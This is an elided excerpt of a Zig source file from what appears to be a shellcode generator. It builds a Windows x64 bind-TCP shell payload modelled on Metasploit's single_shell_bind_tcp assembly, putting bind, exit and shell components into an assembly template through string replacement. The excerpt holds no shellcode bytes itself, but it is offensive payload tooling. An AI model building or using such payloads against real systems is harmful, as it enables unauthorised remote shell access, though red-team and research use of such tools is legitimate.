...
const comp_bind_tcp = @import("components/bind_tcp.zig");
const comp_exitfunk = @import("components/exitfunk.zig");
const comp_shell = @import("components/shell.zig");
const utils = @import("../../utils.zig");

// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/single/single_shell_bind_tcp.asm
pub const asm_code =
    ...
    \\
    \\{COMP_BIND_TCP}               ; %include "asm/windows/x64/components/comp_bind_tcp.asm"
...
pub fn compile(
    ...
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_4, "{COMP_BIND_TCP}", comp_bind_tcp.asm_code);
    const asm_code_new_3 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_4, "{COMP_BIND_TCP}", comp_bind_tcp.asm_code, asm_code_new_3);
    // Replace {COMP_SHELL}
